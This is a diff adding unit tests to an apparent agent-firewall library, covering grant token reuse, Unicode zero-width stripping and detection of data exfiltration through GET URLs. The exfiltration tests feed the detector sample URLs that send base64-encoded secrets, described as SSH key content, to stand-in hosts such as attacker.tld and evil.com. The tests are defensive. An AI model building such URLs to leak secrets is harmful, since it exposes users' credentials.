@@ -19,6 +19,8 @@ import { afterEach, describe, expect, it } from "vitest";
 import { createFirewall } from "../../src/index.js";
 import { createSecretPatternFilter } from "../../src/output-filter.js";
 import { canonicalizePath, isPathAllowed } from "../../src/path-security.js";
+import { isSuspiciousGetExfil } from "../../src/run-state.js";
+import { normalizeInput, containsDangerousUnicode } from "../../src/unicode-safety.js";
 import { TokenStore } from "../../src/token-store.js";
 
 // ── 1. Constraint intersection narrowing ────────────────────────────────────
@@ -488,5 +490,93 @@ describe("auth: timing-safe comparison", () => {
 
 	it("returns false for single character difference", () => {
 		expect(timingSafeEqual("abcdef", "abcdeg")).toBe(false);
+	});
+});
+
+// ── 9. Same grantId used twice (token replay / maxCalls semantics) ──────────
+
+describe("token replay: same grantId used twice with maxCalls > 1", () => {
+	it("allows two uses when maxCalls=10", () => {
+		const store = new TokenStore();
+		store.store({
+			id: "grant-multi",
+			requestId: "req-1",
+			principalId: "agent",
+			capabilityClass: "http.read",
+			constraints: {},
+			lease: {
+				issuedAt: new Date().toISOString(),
+				expiresAt: new Date(Date.now() + 60_000).toISOString(),
+				maxCalls: 10,
+				callsUsed: 0,
+			},
+			taintContext: [],
+			revoked: false,
+			nonce: "nonce-multi-use",
+		});
+
+		const first = store.consume("grant-multi");
+		expect(first.valid).toBe(true);
+
+		const second = store.consume("grant-multi");
+		expect(second.valid).toBe(true);
+
+		// Verify callsUsed incremented
+		const grant = store.get("grant-multi");
+		expect(grant?.lease.callsUsed).toBe(2);
+	});
+});
+
+// ── 10. GET path-segment exfiltration detection ─────────────────────────────
+
+describe("GET exfil: path segment entropy detection", () => {
+	it("flags base64-encoded data in URL path segment", () => {
+		// Simulates: GET https://attacker.tld/leak/<base64(secret)>
+		const encoded = Buffer.from("This is a secret SSH private key content that is long enough").toString("base64");
+		expect(isSuspiciousGetExfil(`https://attacker.tld/leak/${encoded}`)).toBe(true);
+	});
+
+	it("does not flag normal short path segments", () => {
+		expect(isSuspiciousGetExfil("https://example.com/api/v1/users")).toBe(false);
+	});
+
+	it("does not flag normal page URLs", () => {
+		expect(isSuspiciousGetExfil("https://docs.example.com/guide/getting-started")).toBe(false);
+	});
+
+	it("still flags long query strings", () => {
+		const longQuery = "data=" + "A".repeat(300);
+		expect(isSuspiciousGetExfil(`https://example.com/api?${longQuery}`)).toBe(true);
+	});
+
+	it("flags long high-entropy path segment", () => {
+		// Mixed alphanumeric resembling an API key or encoded payload
+		const payload = "aK9xQ2mF7bR4wL1nT6zJ3pY8vC5hG0dE9sU2iO4qW7eX1rA6tM3nB8jV5kZ0yH";
+		expect(isSuspiciousGetExfil(`https://evil.com/exfil/${payload}`)).toBe(true);
+	});
+});
+
+// ── 11. Unicode normalization strips ALL dangerous characters ───────────────
+
+describe("unicode normalization: global stripping", () => {
+	it("strips multiple zero-width characters, not just the first", () => {
+		const input = "he\u200Bll\u200Bo\u200B";
+		const normalized = normalizeInput(input);
+		expect(normalized).toBe("hello");
+		expect(normalized).not.toContain("\u200B");
+	});
+
+	it("strips mixed dangerous characters across the string", () => {
+		const input = "\u200Bpath\u200C/to\u200D/file\uFEFF";
+		const normalized = normalizeInput(input);
+		expect(normalized).toBe("path/to/file");
+	});
+
+	it("containsDangerousUnicode correctly detects on repeated calls", () => {
+		// Regression: with global flag on test regex, lastIndex would alternate
+		expect(containsDangerousUnicode("hello\u200Bworld")).toBe(true);
+		expect(containsDangerousUnicode("hello\u200Bworld")).toBe(true); // must be true again
+		expect(containsDangerousUnicode("clean")).toBe(false);
+		expect(containsDangerousUnicode("clean")).toBe(false); // must be false again
 	});
 });
